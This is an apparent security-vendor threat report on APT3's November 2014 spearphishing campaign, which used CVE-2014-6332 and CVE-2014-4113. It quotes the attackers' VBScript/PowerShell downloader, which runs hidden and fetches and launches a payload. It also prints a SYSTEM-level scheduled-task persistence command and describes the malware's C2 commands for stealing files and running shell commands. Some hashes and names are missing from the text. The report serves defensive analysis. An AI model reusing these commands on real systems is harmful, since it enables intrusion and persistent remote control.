operation double tap
november 21, 2014 | by ned moran, mike scott, mike oppenheim, joshua homan
apt3 (also known as ups), the actors responsible for operation clandestine fox has quietly continued to send waves of spearphishing messages over the past few months. this actor initiated their most recent campaign on november 19, 2014 targeting multiple organizations. the attacker leveraged multiple exploits, targeting both cve-2014-6332 and cve-2014-4113. cve-2014-6332 was disclosed publicly on 2014-11-11 and is a windows ole automation array remote code execution vulnerability. cve-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14. the use of cve-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and apt alike, have now incorporated this exploit into their toolkits. further, the use of both of these two known vulnerabilities in tandem is notable for apt3. this actor is historically known for leveraging zero-day vulnerabilities in widespread but infrequent phishing campaigns. the use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group. the spearphish the body of the message is below: one month's free membership for the playboy club 1080p hd videos 100,000 photos 4,000 models nude celebrities,playmates,cybergirls & more! click hxxp:// / to get a free plus member now & never miss another update. your member referrals must remain active. if anyone getting "promotion not available" for 1 month free membership, you might get the issue up to 48 hrs once your membership is expired and make sure to clear out cookies or use another browser or use another pc. the webpage contained both cve-2014-6332 exploit code and a vbscript that invoked powershell on the affected users system to download the below payload: function runmumaa() on error resume next set shell=createobject("shell.application") shell.shellexecute " ","-nologo -noprofile -noninteractive -windowstyle hidden ( new-object .webclient ).downloadfile( http:// , );invoke-item ", "", "open", 1 end function the cve-2014-6332 exploit code seen in this incident is derived from the code published at http://www.exploit- /, which has also been incorporated in the metasploit project. the downloader after the exploit or script executes, the system downloads , which has the following metadata: md5 size 46592 bytes compile time 2014-11-19 08:55:10z import hash the file attempts to write two files ( and ) to the hard-coded path c:\users\public , which fails on windows xp because that path is not present by default. the first dropped file, , contains the cve-2014-4113 exploit and then attempts to execute with the elevated privileges. these files have the following metadata: (x86): md5 size 12288 bytes import hash (x64): md5 size 13824 bytes compile time 2014-11-19 08:25:45z import hash : md5 size 11264 bytes compile time 2014-11-18 10:49:23z import hash these payload files also have interesting pdb debug strings. : c:\users\aa\documents\visual studio 2008\projects\mshell\release : c:\users\aa\documents\visual studio 2008\projects\4113\release : c:\users\aa\documents\visual studio 2010\projects\myrat\client\client the most interesting pdb string is the , which appears to reference cve-2014-4113. this cve is a local kernel vulnerability that, with successful exploitation, would give any user system access on the machine. the malware component, , uses the windows command " " /c whoami to verify it is running with the elevated privileges of system and creates persistence by creating the following scheduled task: schtasks /create /tn "mysc" /tr c:\users\public\ /sc onlogon /ru "system" when executed, the malware first establishes a socks5 connection to using tcp port 1913. the malware sends the socks5 connection request "05 01 00" and verifies the server response starts with "05 00". the malware then requests a connection to on tcp port 81 using the command "05 01 00 01 c0 b8 3c e5 00 51" and verifies that the first two bytes from the server are "05 00" (c0 b8 3c e5 is the ip address and 00 51 is the port in network byte order). once the connection to the server is established, the malware expects a message containing at least three bytes from the server. these first three bytes are the command identifier. the following commands are supported by the malware: command id description 00 00 00 content after command id is written to: 00 00 01 deletes the files: 00 00 02 malware exits 00 00 03 malware downloads the url that follows the command id. the file is saved to: 00 00 04 content after command id is written to: 00 00 05 the files and are concatenated together and written to and executed 00 00 06 the contents of the following file is sent to the server: 00 00 07 the string following the command id is executed using "cmd /c" and results are sent to server links to apt3 on october 28, we observed apt3 sending out spearphishing messages containing a compressed executable attachment. the deflated exe was a variant of the same downloader described above and connected to over port 1913 via socks5 proxy. the secondary payload in that case was detected as backdoor.apt.cookiecutter (aka pirpi) and also named (md5 ) and connected to the known apt3 domains: inform.bedircati[.]com pn.lamb-site[.]com the ip address seen in this current campaign also hosts securitywap[.]com another known domain referenced in our operation clandestine fox blog. domain first seen last seen ip address 2014-11-17 2014-11-20 www. 2014-11-17 2014-11-20 in addition, the join.playboysplus[.]com exploit and payload delivery site resolves to . this ip has hosted other domains used by apt3 in past campaigns: domain first seen last seen ip address join.playboysplus[.]com 2014-11-21 2014-11-21 walterclean[.]com 2014-11-18 2014-11-20 www.walterclean[.]com 2014-11-18 2014-11-20 as we discussed in our previous blog detailing previous apt3 activity, the walterclean[.]com served as a plugx/kaba command and control server. conclusion although apt3 is well known for employing zero-day exploits in their attacks, recent activity has demonstrated that they will also attack targets with known exploits or social engineering. since operation clandestine fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits. the combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code. no matter the strategy, this actor has shown an ability to operate successfully. iocs for this threat can be found here.